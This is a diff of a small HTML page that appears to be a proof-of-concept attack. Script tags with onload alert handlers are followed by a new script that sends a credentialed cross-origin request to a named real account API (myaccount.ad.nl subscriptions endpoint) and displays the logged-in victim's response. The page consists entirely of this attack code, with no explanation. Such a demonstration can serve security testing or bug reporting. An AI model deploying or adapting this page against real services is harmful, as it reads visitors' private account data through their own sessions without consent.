@@ -2,8 +2,14 @@
 <html><body>
 <script src="https://hatichani.github.io/" onload="alert(1)" id="csrf"></script>
 <script src="https://hatichani.github.io/index.html" onload="alert(2)" id="csr"></script>
-<?php
-echo file_get_contents("test.txt");
-?>
+<script>
+var xhttp = new XMLHttpRequest();
+  xhttp.open("GET", "https://myaccount.ad.nl/rest/subscriptions");
+  xhttp.withCredentials = true;
+  xhttp.send();
+xhttp.onload = function() {
+    alert(this.responseText);
+  }
+</script>
 </body>
 </html>
